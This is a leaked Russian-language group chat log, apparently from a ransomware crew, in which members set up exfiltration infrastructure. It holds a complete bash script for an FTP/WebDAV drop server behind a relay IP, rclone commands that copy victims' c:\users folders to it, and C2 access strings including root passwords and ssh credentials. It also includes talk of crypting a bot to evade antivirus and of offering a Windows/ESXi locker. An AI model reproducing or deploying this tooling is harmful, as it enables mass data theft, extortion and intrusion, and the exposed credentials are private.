@@ -1,0 +1,837 @@
+[2023-10-28 02:31:01] @usernameyy:matrix.bestflowers247.online: да
+--------------------
+[2023-10-28 02:31:32] @usernameyy:matrix.bestflowers247.online: ты че встал уже что ли
+--------------------
+[2023-10-28 02:36:06] @usernameyy:matrix.bestflowers247.online: ставим  на сервер фтп
+```
+export prokladka_ip=185.243.112.107 # Используется для указания прокладки для фтп/вебдава, а также для формирования rclone конфига
+
+apt -y update
+apt install -y sudo
+sudo apt -y install rclone
+sudo apt -y install vsftpd
+# sudo apt -y install cadaver
+sudo apt -y install dnsutils
+# sudo apt -y install expect
+sudo apt -y install nginx nginx-extras libnginx-mod-http-dav-ext libnginx-mod-http-auth-pam apache2-utils libnginx-mod-http-fancyindex
+sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.orig
+
+sudo rm /etc/nginx/sites-enabled/default
+sudo rm /etc/vsftpd.userlist
+sudo rm /etc/nginx/conf.d/default.conf
+sudo rm /etc/nginx/.cred.list
+sudo rm /ftppwd.txt
+sudo rm /etc/certs/domain_pem_key
+
+mkdir /data
+mkdir /data/www
+mkdir /etc/certs
+echo "dkjoasidjw@dsadxas" > /etc/certs/domain_pem_key
+sudo ufw disable
+
+export publicUsername="ftp_white"
+export publicPassword=$(</dev/urandom tr -dc '12345!@#%qwertQWERTasdfgASDFGzxcvbZXCVB' | head -c40; echo "")
+
+sudo echo "$publicPassword" > "/ftppwd.txt"
+
+sudo adduser $publicUsername --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
+echo "$publicUsername:$publicPassword" | chpasswd
+
+mkdir /etc/cert
+
+#sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/vsftpd.pem -out /etc/ssl/private/vsftpd.pem
+openssl req -newkey rsa:2048 -keyout /etc/certs/domain.key -passout pass:"dkjoasidjw@dsadxas" -x509 -days 365 -out /etc/certs/domain.crt -subj "/C=GB/ST=London/L=London/O=Global Security/OU=IT Department/CN=$DOMAINNAME"
+
+
+echo "listen=YES
+listen_ipv6=NO
+connect_from_port_20=YES
+anonymous_enable=NO
+local_enable=YES
+write_enable=YES
+chroot_local_user=YES
+allow_writeable_chroot=YES
+secure_chroot_dir=/var/run/vsftpd/empty
+pam_service_name=vsftpd
+pasv_enable=YES
+pasv_address=$prokladka_ip
+pasv_min_port=10000
+pasv_max_port=11000
+userlist_enable=YES
+userlist_file=/etc/vsftpd.userlist
+userlist_deny=NO
+local_root=/data/www
+rsa_cert_file=/etc/cert/vsftpd.pem
+rsa_private_key_file=/etc/cert/vsftpd.key
+ssl_enable=NO
+allow_anon_ssl=NO
+force_local_data_ssl=NO
+force_local_logins_ssl=NO
+ssl_tlsv1=YES
+ssl_sslv2=NO
+ssl_sslv3=NO
+require_ssl_reuse=NO
+ssl_ciphers=HIGH
+implicit_ssl=YES
+listen_port=21
+max_per_ip=99999
+mdtm_write=YES" > /etc/vsftpd.conf
+echo "$publicUsername" | sudo tee -a /etc/vsftpd.userlist
+sudo systemctl restart vsftpd
+sudo systemctl enable vsftpd
+
+sudo mkdir /home/nginx
+sudo chown -R www-data /home/nginx
+sudo htpasswd -b -c /etc/nginx/.cred.list $publicUsername $publicPassword
+#sudo htpasswd -b -c /etc/nginx/.cred.list ftp_white "rSvbcr2fTAs5AZ2bBS@cA@VBtqTbz1d@sBebQQFs"
+#sudo certbot certonly --standalone --preferred-challenges http -d datbcp.com
+
+echo " server_tokens off;
+server {
+#listen 80 default_server;
+listen 443 default_server ssl;
+auth_basic \"Restricted Access\";
+auth_basic_user_file /etc/nginx/.cred.list;
+ssl_certificate     /etc/certs/domain.crt;
+ssl_certificate_key /etc/certs/domain.key;
+ssl_password_file /etc/certs/domain_pem_key;
+location ~ ^/(.*)$ {
+alias /home/$publicUsername/\$1;
+dav_methods PUT DELETE MKCOL COPY MOVE;
+dav_ext_methods PROPFIND OPTIONS;
+dav_access user:rw group:rw all:rw;
+client_max_body_size 100G;
+create_full_put_path on;
+client_body_temp_path /tmp;
+
+#        auth_pam \"Restricted\";
+#        auth_pam_service_name \"common-auth\";
+fancyindex    on;
+fancyindex_exact_size off;
+}
+}" >> /etc/nginx/conf.d/default.conf
+sudo chown $publicUsername /data/www
+sudo systemctl restart nginx
+
+rclone config -vv create $publicUsername ftp --config rclone.conf host "$prokladka_ip" user "$publicUsername" port 22
+rclone config password $publicUsername --config rclone.conf pass "$publicPassword"
+
+# cat $publicUsername.conf
+#response rclone.conf
+
+```
+nano isntall.sh
+вписываете туда этот скрипт
+потом chmod +x ./install.sh
+потом просто ./install.sh
+установка завершится и появится конфиг с именем ftp_white.conf в домашней директории (обычно ~/)
+этот конфиг на сетку качаете и запускаете с ним rclone
+--------------------
+[2023-10-28 02:36:09] @usernameyy:matrix.bestflowers247.online: вы онлайн?
+--------------------
+[2023-10-28 02:39:55] @usernameyy:matrix.bestflowers247.online: пример рклон команды
+```
+rclone --config="c:\rclone.conf" --progress copy c:\users ftp_white:\
+--------------------
+[2023-10-28 02:40:05] @usernameyy:matrix.bestflowers247.online: * пример рклон команды
+
+```
+rclone --config="c:\rclone.conf" --transfers=40 --progress copy c:\users ftp_white:\
+```
+--------------------
+[2023-10-28 02:40:30] @usernameyy:matrix.bestflowers247.online: скопировать в из папки c:\users на удаленный сервер (в конфиге как ftp_white)
+--------------------
+[2023-10-28 02:40:47] @usernameyy:matrix.bestflowers247.online: по умолчанию конфиг будет на 22 порт, это ssh
+--------------------
+[2023-10-28 02:41:50] @usernameyy:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> ставим  на сервер фтп
+> ```
+> export prokladka_ip=185.243.112.107 # Используется для указания прокладки для фтп/вебдава, а также для формирования rclone конфига
+>
+> apt -y update
+> apt install -y sudo
+> sudo apt -y install rclone
+> sudo apt -y install vsftpd
+> # sudo apt -y install cadaver
+> sudo apt -y install dnsutils
+> # sudo apt -y install expect
+> sudo apt -y install nginx nginx-extras libnginx-mod-http-dav-ext libnginx-mod-http-auth-pam apache2-utils libnginx-mod-http-fancyindex
+> sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.orig
+>
+> sudo rm /etc/nginx/sites-enabled/default
+> sudo rm /etc/vsftpd.userlist
+> sudo rm /etc/nginx/conf.d/default.conf
+> sudo rm /etc/nginx/.cred.list
+> sudo rm /ftppwd.txt
+> sudo rm /etc/certs/domain_pem_key
+>
+> mkdir /data
+> mkdir /data/www
+> mkdir /etc/certs
+> echo "dkjoasidjw@dsadxas" > /etc/certs/domain_pem_key
+> sudo ufw disable
+>
+> export publicUsername="ftp_white"
+> export publicPassword=$(</dev/urandom tr -dc '12345!@#%qwertQWERTasdfgASDFGzxcvbZXCVB' | head -c40; echo "")
+>
+> sudo echo "$publicPassword" > "/ftppwd.txt"
+>
+> sudo adduser $publicUsername --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
+> echo "$publicUsername:$publicPassword" | chpasswd
+>
+> mkdir /etc/cert
+>
+> #sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/vsftpd.pem -out /etc/ssl/private/vsftpd.pem
+> openssl req -newkey rsa:2048 -keyout /etc/certs/domain.key -passout pass:"dkjoasidjw@dsadxas" -x509 -days 365 -out /etc/certs/domain.crt -subj "/C=GB/ST=London/L=London/O=Global Security/OU=IT Department/CN=$DOMAINNAME"
+>
+>
+> echo "listen=YES
+> listen_ipv6=NO
+> connect_from_port_20=YES
+> anonymous_enable=NO
+> local_enable=YES
+> write_enable=YES
+> chroot_local_user=YES
+> allow_writeable_chroot=YES
+> secure_chroot_dir=/var/run/vsftpd/empty
+> pam_service_name=vsftpd
+> pasv_enable=YES
+> pasv_address=$prokladka_ip
+> pasv_min_port=10000
+> pasv_max_port=11000
+> userlist_enable=YES
+> userlist_file=/etc/vsftpd.userlist
+> userlist_deny=NO
+> local_root=/data/www
+> rsa_cert_file=/etc/cert/vsftpd.pem
+> rsa_private_key_file=/etc/cert/vsftpd.key
+> ssl_enable=NO
+> allow_anon_ssl=NO
+> force_local_data_ssl=NO
+> force_local_logins_ssl=NO
+> ssl_tlsv1=YES
+> ssl_sslv2=NO
+> ssl_sslv3=NO
+> require_ssl_reuse=NO
+> ssl_ciphers=HIGH
+> implicit_ssl=YES
+> listen_port=21
+> max_per_ip=99999
+> mdtm_write=YES" > /etc/vsftpd.conf
+> echo "$publicUsername" | sudo tee -a /etc/vsftpd.userlist
+> sudo systemctl restart vsftpd
+> sudo systemctl enable vsftpd
+>
+> sudo mkdir /home/nginx
+> sudo chown -R www-data /home/nginx
+> sudo htpasswd -b -c /etc/nginx/.cred.list $publicUsername $publicPassword
+> #sudo htpasswd -b -c /etc/nginx/.cred.list ftp_white "rSvbcr2fTAs5AZ2bBS@cA@VBtqTbz1d@sBebQQFs"
+> #sudo certbot certonly --standalone --preferred-challenges http -d datbcp.com
+>
+> echo " server_tokens off;
+> server {
+>     #listen 80 default_server;
+>     listen 443 default_server ssl;
+>     auth_basic \"Restricted Access\";
+>     auth_basic_user_file /etc/nginx/.cred.list;
+>         ssl_certificate     /etc/certs/domain.crt;
+>         ssl_certificate_key /etc/certs/domain.key;
+>         ssl_password_file /etc/certs/domain_pem_key;
+>         location ~ ^/(.*)$ {
+>         alias /home/$publicUsername/\$1;
+>         dav_methods PUT DELETE MKCOL COPY MOVE;
+>         dav_ext_methods PROPFIND OPTIONS;
+>         dav_access user:rw group:rw all:rw;
+>         client_max_body_size 100G;
+>         create_full_put_path on;
+>         client_body_temp_path /tmp;
+>
+> #        auth_pam \"Restricted\";
+> #        auth_pam_service_name \"common-auth\";
+>         fancyindex    on;
+>         fancyindex_exact_size off;
+>     }
+> }" >> /etc/nginx/conf.d/default.conf
+> sudo chown $publicUsername /data/www
+> sudo systemctl restart nginx
+>
+> rclone config -vv create $publicUsername ftp --config rclone.conf host "$prokladka_ip" user "$publicUsername" port 22
+> rclone config password $publicUsername --config rclone.conf pass "$publicPassword"
+>
+> # cat $publicUsername.conf
+> #response rclone.conf
+>
+> ```
+> nano isntall.sh
+> вписываете туда этот скрипт
+> потом chmod +x ./install.sh
+> потом просто ./install.sh
+> установка завершится и появится конфиг с именем ftp_white.conf в домашней директории (обычно ~/)
+> этот конфиг на сетку качаете и запускаете с ним rclone
+
+скрипт удалить не забудьте
+--------------------
+[2023-10-28 05:57:12] @usernameyy:matrix.bestflowers247.online: я пошел кушать, ноут с собой беру
+--------------------
+[2023-10-28 07:03:25] @usernamehh:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> вы онлайн?
+
+да
+--------------------
+[2023-10-28 07:03:44] @usernameff:matrix.bestflowers247.online: ++
+--------------------
+[2023-10-28 10:05:11] @usernamegg:matrix.bestflowers247.online: ты что там рано ?
+--------------------
+[2023-10-28 10:10:05] @usernamegg:matrix.bestflowers247.online: взяли сервер для выкачки ?
+--------------------
+[2023-10-28 10:10:37] @usernamejj:matrix.bestflowers247.online: да, тестируем сейчас
+--------------------
+[2023-10-28 10:48:23] @usernamegg:matrix.bestflowers247.online: что именно ?
+--------------------
+[2023-10-28 10:48:27] @usernamegg:matrix.bestflowers247.online: выкачку ?
+--------------------
+[2023-10-28 10:48:31] @usernamegg:matrix.bestflowers247.online: так
+--------------------
+[2023-10-28 10:48:37] @usernamegg:matrix.bestflowers247.online: смотрите
+--------------------
+[2023-10-28 10:48:38] @usernamegg:matrix.bestflowers247.online: сделайте конф
+--------------------
+[2023-10-28 10:48:43] @usernamegg:matrix.bestflowers247.online: позовите свою впску в кобу
+--------------------
+[2023-10-28 10:48:46] @usernamegg:matrix.bestflowers247.online: накидайте туда файлов
+--------------------
+[2023-10-28 10:48:54] @usernamegg:matrix.bestflowers247.online: залейте через кобу туда рклоне
+--------------------
+[2023-10-28 10:48:59] @usernamejj:matrix.bestflowers247.online: пока что rclone заливается
+--------------------
+[2023-10-28 10:49:09] @usernamejj:matrix.bestflowers247.online: он через dns
+--------------------
+[2023-10-28 10:49:10] @usernamegg:matrix.bestflowers247.online: эмитацию сделайте что это тачка на которой лежит дата и с нее нада выкачать ее
+--------------------
+[2023-10-28 10:49:34] @usernamegg:matrix.bestflowers247.online: > <@usernamejj:matrix.bestflowers247.online> он через dns
+
+да, я понимаю долго будет
+--------------------
+[2023-10-28 10:49:37] @usernamegg:matrix.bestflowers247.online: какая коба днс ?
+--------------------
+[2023-10-28 10:49:45] @usernamejj:matrix.bestflowers247.online: cob3dns
+--------------------
+[2023-10-28 10:49:48] @usernamegg:matrix.bestflowers247.online: вы по порту позовите пока впску свою
+--------------------
+[2023-10-28 10:50:10] @usernamegg:matrix.bestflowers247.online: просто тупо файвол 10-20 насоздавайте и поставить на выкачку
+--------------------
+[2023-10-28 10:50:19] @usernamegg:matrix.bestflowers247.online: так поймете сразу как качает
+--------------------
+[2023-10-28 10:50:32] @usernamejj:matrix.bestflowers247.online: мы сегодня новую кобу портовую сделат хотели, но она не создается через билдер, YY оффлайн
+--------------------
+[2023-10-28 10:50:35] @usernamegg:matrix.bestflowers247.online: сегодня за день качнете а ночью поставите ее
+--------------------
+[2023-10-28 10:50:49] @usernamegg:matrix.bestflowers247.online: > <@usernamejj:matrix.bestflowers247.online> мы сегодня новую кобу портовую сделат хотели, но она не создается через билдер, YY оффлайн
+
+сейчас скажу что бы вышел
+--------------------
+[2023-10-28 10:50:53] @usernamegg:matrix.bestflowers247.online: сервера уже под нее готовы ?
+--------------------
+[2023-10-28 10:51:03] @usernamejj:matrix.bestflowers247.online: да
+--------------------
+[2023-10-28 10:52:01] @usernamegg:matrix.bestflowers247.online: а старых нет кобы ?
+--------------------
+[2023-10-28 10:52:04] @usernamegg:matrix.bestflowers247.online: по порту
+--------------------
+[2023-10-28 10:52:14] @usernamejj:matrix.bestflowers247.online: туда не приходят
+--------------------
+[2023-10-28 10:52:52] @usernamegg:matrix.bestflowers247.online: впски ?
+--------------------
+[2023-10-28 10:52:58] @usernamegg:matrix.bestflowers247.online: сейчас
+--------------------
+[2023-10-28 10:53:11] @usernamejj:matrix.bestflowers247.online: впс сейчас попробуем
+--------------------
+[2023-10-28 10:53:32] @usernamegg:matrix.bestflowers247.online: сейчас дам кобу куда все приходит но там биконы у нас висят
+--------------------
+[2023-10-28 10:53:43] @usernamegg:matrix.bestflowers247.online: COBA://51.222.194.208:37840
+4OmKmFUjNuC5skQmvjOT3Jz169ltwWAD5Aj
+--------------------
+[2023-10-28 10:53:48] @usernamegg:matrix.bestflowers247.online: вот в этой кобе потестируйте
+--------------------
+[2023-10-28 10:54:01] @usernamegg:matrix.bestflowers247.online: cob_8 это в нас коба
+--------------------
+[2023-10-28 10:54:12] @usernamegg:matrix.bestflowers247.online: сюда зайдите сделайтапе пейлоад и позовите таргет
+--------------------
+[2023-10-28 10:54:19] @usernamejj:matrix.bestflowers247.online: хорошо
+--------------------
+[2023-10-28 10:59:49] @usernameyy:matrix.bestflowers247.online: > <@usernamejj:matrix.bestflowers247.online> мы сегодня новую кобу портовую сделат хотели, но она не создается через билдер, YY оффлайн
+
+ребутнул
+--------------------
+[2023-10-28 10:59:57] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2023-10-28 11:00:06] @usernameyy:matrix.bestflowers247.online: берите проверенные сервера, если не выдает
+--------------------
+[2023-10-28 11:00:13] @usernameyy:matrix.bestflowers247.online: у всех хостеров разная настройка
+--------------------
+[2023-10-28 11:00:19] @usernameyy:matrix.bestflowers247.online: да я дела все спихнул на субботу
+--------------------
+[2023-10-28 11:00:22] @usernameyy:matrix.bestflowers247.online: вот выполняю потихоньку
+--------------------
+[2023-10-28 11:00:27] @usernameyy:matrix.bestflowers247.online: ладно зовут уже отвечать
+--------------------
+[2023-10-28 11:00:32] @usernameyy:matrix.bestflowers247.online: приду через минут 15 надеюсь
+--------------------
+[2023-10-28 11:01:19] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2023-10-28 11:46:10] @usernamegg:matrix.bestflowers247.online: почему не поставилась коба ?
+--------------------
+[2023-10-28 11:48:16] @usernameyy:matrix.bestflowers247.online: ```
+The following packages have unmet dependencies:
+python3-zope.hookable : Depends: python3 (< 3.6) but 3.9.2-3 is to be installed
+python3-zope.interface : Depends: python3 (< 3.6) but 3.9.2-3 is to be installed
+E: Unable to correct problems, you have held broken packages.
+
+--------------------
+[2023-10-28 11:49:15] @usernameyy:matrix.bestflowers247.online: сломаны зеркала на впс и ничего не ставится, требует питон более ранней версии, а это невозможно. Апгрейд и апдейт  не работают тоже, в общем последствия самой дешевой впс на нн хостинге
+--------------------
+[2023-10-28 11:50:10] @usernamegg:matrix.bestflowers247.online: сейчас он в другом возьмет месте сервера
+--------------------
+[2023-10-28 12:15:59] @usernameyy:matrix.bestflowers247.online: сделали?
+--------------------
+[2023-10-28 12:16:16] @usernamehh:matrix.bestflowers247.online: 5 минут
+--------------------
+[2023-10-28 12:22:49] @usernamegg:matrix.bestflowers247.online: я с FF рядом сижу
+--------------------
+[2023-10-28 12:22:56] @usernamegg:matrix.bestflowers247.online: сейчас научим их качать
+--------------------
+[2023-10-28 12:23:01] @usernamegg:matrix.bestflowers247.online: а то большой забелел
+--------------------
+[2023-10-28 12:23:08] @usernamegg:matrix.bestflowers247.online: а VV не стабильный
+--------------------
+[2023-10-28 12:23:34] @usernameyy:matrix.bestflowers247.online: хорошо
+--------------------
+[2023-10-28 12:53:51] @usernameyy:matrix.bestflowers247.online: нервов не хватит, легче все самому делать
+--------------------
+[2023-10-28 12:54:30] @usernamegg:matrix.bestflowers247.online: HH - очень не компетентен
+--------------------
+[2023-10-28 12:54:38] @usernamegg:matrix.bestflowers247.online: JJ - молодец
+--------------------
+[2023-10-28 12:54:53] @usernamegg:matrix.bestflowers247.online: но ему надо объяснить как выкачивать и посмотри что у него с конфигом
+--------------------
+[2023-10-28 12:55:08] @usernameyy:matrix.bestflowers247.online: занимаюсь, почему то в нгинксе пишет прав нет
+--------------------
+[2023-10-28 12:55:18] @usernameyy:matrix.bestflowers247.online: не могу пока понять как их система забрала
+--------------------
+[2023-10-28 12:55:45] @usernameyy:matrix.bestflowers247.online: image.png
+--------------------
+[2023-10-28 12:55:55] @usernameyy:matrix.bestflowers247.online: HH:
+--------------------
+[2023-10-28 12:56:01] @usernameyy:matrix.bestflowers247.online: 5 пункт
+--------------------
+[2023-10-28 12:57:04] @usernameyy:matrix.bestflowers247.online: я так понимаю кто-то из вас нажал на кнопку Save server to bd
+--------------------
+[2023-10-28 12:57:08] @usernameyy:matrix.bestflowers247.online: ```
+104.200.72.124
+u: root
+p: U)]@@#-]R5deWF2D7RpxXxo41Q
+
+
+--------------------
+[2023-10-28 12:57:46] @usernameyy:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> я так понимаю кто-то из вас нажал на кнопку Save server to bd
+
+не нажимайте ее пожалуйста, вы сломаете конфиг
+--------------------
+[2023-10-28 12:59:38] @usernameyy:matrix.bestflowers247.online: ```
+export prokladka_ip=185.243.112.107 # Используется для указания прокладки для фтп/вебдава, а также для формирования rclone конфига
+
+apt -y update
+apt install -y sudo
+sudo apt -y install rclone
+sudo apt -y install vsftpd
+# sudo apt -y install cadaver
+sudo apt -y install dnsutils
+# sudo apt -y install expect
+sudo apt -y install nginx nginx-extras libnginx-mod-http-dav-ext libnginx-mod-http-auth-pam apache2-utils libnginx-mod-http-fancyindex
+sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.orig
+
+sudo rm /etc/nginx/sites-enabled/default
+sudo rm /etc/vsftpd.userlist
+sudo rm /etc/nginx/conf.d/default.conf
+sudo rm /etc/nginx/.cred.list
+sudo rm /ftppwd.txt
+sudo rm /etc/certs/domain_pem_key
+
+mkdir /data
+mkdir /data/www
+mkdir /etc/certs
+echo "dkjoasidjw@dsadxas" > /etc/certs/domain_pem_key
+sudo ufw disable
+
+export publicUsername="ftp_white"
+export publicPassword=$(</dev/urandom tr -dc '12345!@#%qwertQWERTasdfgASDFGzxcvbZXCVB' | head -c40; echo "")
+
+sudo echo "$publicPassword" > "/ftppwd.txt"
+
+sudo adduser $publicUsername --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
+echo "$publicUsername:$publicPassword" | chpasswd
+
+mkdir /etc/cert
+
+#sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/vsftpd.pem -out /etc/ssl/private/vsftpd.pem
+openssl req -newkey rsa:2048 -keyout /etc/certs/domain.key -passout pass:"dkjoasidjw@dsadxas" -x509 -days 365 -out /etc/certs/domain.crt -subj "/C=GB/ST=London/L=London/O=Global Security/OU=IT Department/CN=$DOMAINNAME"
+
+
+echo "listen=YES
+listen_ipv6=NO
+connect_from_port_20=YES
+anonymous_enable=NO
+local_enable=YES
+write_enable=YES
+chroot_local_user=YES
+allow_writeable_chroot=YES
+secure_chroot_dir=/var/run/vsftpd/empty
+pam_service_name=vsftpd
+pasv_enable=YES
+pasv_address=$prokladka_ip
+pasv_min_port=10000
+pasv_max_port=11000
+userlist_enable=YES
+userlist_file=/etc/vsftpd.userlist
+userlist_deny=NO
+local_root=/data/www
+rsa_cert_file=/etc/cert/vsftpd.pem
+rsa_private_key_file=/etc/cert/vsftpd.key
+ssl_enable=NO
+allow_anon_ssl=NO
+force_local_data_ssl=NO
+force_local_logins_ssl=NO
+ssl_tlsv1=YES
+ssl_sslv2=NO
+ssl_sslv3=NO
+require_ssl_reuse=NO
+ssl_ciphers=HIGH
+implicit_ssl=YES
+listen_port=21
+max_per_ip=99999
+mdtm_write=YES" > /etc/vsftpd.conf
+echo "$publicUsername" | sudo tee -a /etc/vsftpd.userlist
+sudo systemctl restart vsftpd
+sudo systemctl enable vsftpd
+
+sudo mkdir /home/nginx
+sudo chown -R www-data /home/nginx
+sudo htpasswd -b -c /etc/nginx/.cred.list $publicUsername $publicPassword
+#sudo htpasswd -b -c /etc/nginx/.cred.list ftp_white "rSvbcr2fTAs5AZ2bBS@cA@VBtqTbz1d@sBebQQFs"
+#sudo certbot certonly --standalone --preferred-challenges http -d datbcp.com
+
+echo " server_tokens off;
+server {
+#listen 80 default_server;
+listen 443 default_server ssl;
+auth_basic \"Restricted Access\";
+auth_basic_user_file /etc/nginx/.cred.list;
+ssl_certificate     /etc/certs/domain.crt;
+ssl_certificate_key /etc/certs/domain.key;
+ssl_password_file /etc/certs/domain_pem_key;
+location ~ ^/(.*)$ {
+alias /home/$publicUsername/\$1;
+dav_methods PUT DELETE MKCOL COPY MOVE;
+dav_ext_methods PROPFIND OPTIONS;
+dav_access user:rw group:rw all:rw;
+client_max_body_size 100G;
+create_full_put_path on;
+client_body_temp_path /tmp;
+
+#        auth_pam \"Restricted\";
+#        auth_pam_service_name \"common-auth\";
+fancyindex    on;
+fancyindex_exact_size off;
+}
+}" >> /etc/nginx/conf.d/default.conf
+sudo chown $publicUsername /data/www
+sudo chown $publicUsername /home/$publicUsername
+sudo chmod 777 -R /home/$publicUsername
+sudo chmod 777 -R /data/www
+sudo systemctl restart nginx
+
+rclone config -vv create $publicUsername ftp --config rclone.conf host "$prokladka_ip" user "$publicUsername" port 22
+rclone config password $publicUsername --config rclone.conf pass "$publicPassword"
+
+# cat $publicUsername.conf
+#response rclone.conf
+
+--------------------
+[2023-10-28 12:59:41] @usernameyy:matrix.bestflowers247.online: JJ:
+--------------------
+[2023-10-28 12:59:45] @usernameyy:matrix.bestflowers247.online: ```
+sudo chown $publicUsername /data/www
+sudo chown $publicUsername /home/$publicUsername
+sudo chmod 777 -R /home/$publicUsername
+sudo chmod 777 -R /data/www
+--------------------
+[2023-10-28 12:59:48] @usernameyy:matrix.bestflowers247.online: добавил эти строки
+--------------------
+[2023-10-28 12:59:57] @usernameyy:matrix.bestflowers247.online: они обновляют права на вновь созданного юзера
+--------------------
+[2023-10-28 13:00:11] @usernameyy:matrix.bestflowers247.online: chown - изменить владельца
+chmod -  сделать возможность записи и чтения
+--------------------
+[2023-10-28 13:01:22] @usernameyy:matrix.bestflowers247.online: жду еще кобу вашу
+--------------------
+[2023-10-28 13:01:28] @usernameyy:matrix.bestflowers247.online: ты весь день там будешь?
+--------------------
+[2023-10-28 13:04:06] @usernamegg:matrix.bestflowers247.online: я пока тут
+--------------------
+[2023-10-28 13:04:14] @usernamegg:matrix.bestflowers247.online: скоро поеду
+--------------------
+[2023-10-28 13:04:44] @usernameyy:matrix.bestflowers247.online: пошла выкачка да? JJ
+--------------------
+[2023-10-28 13:05:12] @usernamejj:matrix.bestflowers247.online: да, работает, скачивается
+--------------------
+[2023-10-28 13:05:31] @usernameyy:matrix.bestflowers247.online: збс, кобы ставятся пока
+--------------------
+[2023-10-28 13:05:38] @usernameyy:matrix.bestflowers247.online: какие конфигы сервов там?
+--------------------
+[2023-10-28 13:06:08] @usernamegg:matrix.bestflowers247.online: где это ?
+--------------------
+[2023-10-28 13:06:29] @usernameyy:matrix.bestflowers247.online: коба прокси коб мейн
+--------------------
+[2023-10-28 13:06:36] @usernameyy:matrix.bestflowers247.online: долго ставятся, лучше брать получше конфиг
+--------------------
+[2023-10-28 13:09:50] @usernamegg:matrix.bestflowers247.online: SMTP2810.txt
+--------------------
+[2023-10-28 13:09:56] @usernamegg:matrix.bestflowers247.online: IMAP2810.txt
+--------------------
+[2023-10-28 13:19:56] @usernameyy:matrix.bestflowers247.online: HH: CentOS Linux 8
+
+--------------------
+[2023-10-28 13:20:03] @usernameyy:matrix.bestflowers247.online: на втором сервере
+--------------------
+[2023-10-28 13:20:22] @usernameyy:matrix.bestflowers247.online: требование debian 11, в крайнем случай убунту
+--------------------
+[2023-10-28 13:20:31] @usernamehh:matrix.bestflowers247.online: поменять?
+--------------------
+[2023-10-28 13:20:43] @usernameyy:matrix.bestflowers247.online: убунту только в том случае если дебиан 11 нет (то есть никогда желательно)
+--------------------
+[2023-10-28 13:20:45] @usernameyy:matrix.bestflowers247.online: > <@usernamehh:matrix.bestflowers247.online> поменять?
+
+да
+--------------------
+[2023-10-28 13:20:59] @usernameyy:matrix.bestflowers247.online: это XX регал?
+--------------------
+[2023-10-28 13:21:15] @usernameyy:matrix.bestflowers247.online: сомневаюсь что он центос просто выбрал
+--------------------
+[2023-10-28 13:21:51] @usernamehh:matrix.bestflowers247.online: это я регал
+--------------------
+[2023-10-28 13:22:28] @usernameyy:matrix.bestflowers247.online: пон, ну вот в общем debian 11 должна быть
+--------------------
+[2023-10-28 13:22:52] @usernamehh:matrix.bestflowers247.online: ага, я  знаю
+--------------------
+[2023-10-28 13:23:01] @usernamehh:matrix.bestflowers247.online: наебался при установке
+--------------------
+[2023-10-28 13:23:07] @usernameyy:matrix.bestflowers247.online: 👌
+--------------------
+[2023-10-28 13:32:02] @usernameyy:matrix.bestflowers247.online: дальше как обычно, я ушел
+--------------------
+[2023-10-28 13:32:20] @usernamehh:matrix.bestflowers247.online: хорошо, спасибо
+--------------------
+[2023-10-28 13:32:26] @usernameyy:matrix.bestflowers247.online: пожалуйста
+--------------------
+[2023-10-28 16:25:31] @w:matrixtcFJHPDblmt2rg.network: https://scanner.to/result/jyJpe6o1mn
+--------------------
+[2023-10-28 16:25:55] @w:matrixtcFJHPDblmt2rg.network: почистил бота, комодо всегда такой детект выдает ( это не детект, это он просто всегда запускается все что без серта в такой оболочке )
+--------------------
+[2023-10-28 16:26:17] @w:matrixtcFJHPDblmt2rg.network: а нортон я вообще в душе не ебу что палит, не хочу даже разбираться пока что с ним, слишком он уж геморный
+--------------------
+[2023-10-28 16:26:18] @w:matrixtcFJHPDblmt2rg.network: Привет
+--------------------
+[2023-10-28 16:26:57] @w:matrixtcFJHPDblmt2rg.network: это если что результат без крипта
+--------------------
+[2023-10-28 16:28:18] @w:matrixtcFJHPDblmt2rg.network: мне кажется, что этот злоебучий нортон все палит, конченый АВ какой то
+--------------------
+[2023-10-28 16:31:09] @w:matrixtcFJHPDblmt2rg.network: вообще криптом должен обходится, ибо это статика палится насколько я вижу, кароче с криптом еще проверю его
+--------------------
+[2023-10-28 17:15:55] @usernameyy:matrix.bestflowers247.online: ну как дела
+--------------------
+[2023-10-28 17:17:18] @usernameyy:matrix.bestflowers247.online: локер вам нужен? я сообираюсь отключать билдеры
+--------------------
+[2023-10-28 17:22:27] @usernamejj:matrix.bestflowers247.online: можно отключать, у нас hyper-v
+--------------------
+[2023-10-28 17:22:41] @usernameyy:matrix.bestflowers247.online: hyper v же тоже лочить надо)
+--------------------
+[2023-10-28 17:22:47] @usernameyy:matrix.bestflowers247.online: виндовс локером
+--------------------
+[2023-10-28 17:23:18] @usernamejj:matrix.bestflowers247.online: я думал про esxi-панель
+--------------------
+[2023-10-28 17:23:37] @usernameyy:matrix.bestflowers247.online: лан, завтра тогда
+--------------------
+[2023-10-28 17:26:41] @usernameyy:matrix.bestflowers247.online: а кобы сделали?
+--------------------
+[2023-10-28 17:28:11] @usernamehh:matrix.bestflowers247.online: выдает первую часть прокси только
+--------------------
+[2023-10-28 17:29:03] @usernamehh:matrix.bestflowers247.online: сменил do
+--------------------
+[2023-10-28 17:29:09] @usernameyy:matrix.bestflowers247.online: сейчас проверю
+--------------------
+[2023-10-28 17:29:17] @usernamehh:matrix.bestflowers247.online: давай
+--------------------
+[2023-10-28 17:34:28] @usernameyy:matrix.bestflowers247.online: я вижу что была какая то ошибка, но почему то когда  я запустил всё ок)
+--------------------
+[2023-10-28 17:34:31] @usernameyy:matrix.bestflowers247.online: ```
+>>> Coba PROXY <<<
+port: 52331
+ssh -p52331 root@143.198.42.55
+TcokM9SEpYOlJEoyOAF5Pa47QAnzDWA8xo1
+domain: foxye01o.net
+https://foxye01o.net (Ports: 80,443,8080,8888,7575,4444)
+----------------------------------------------------------------------------------------
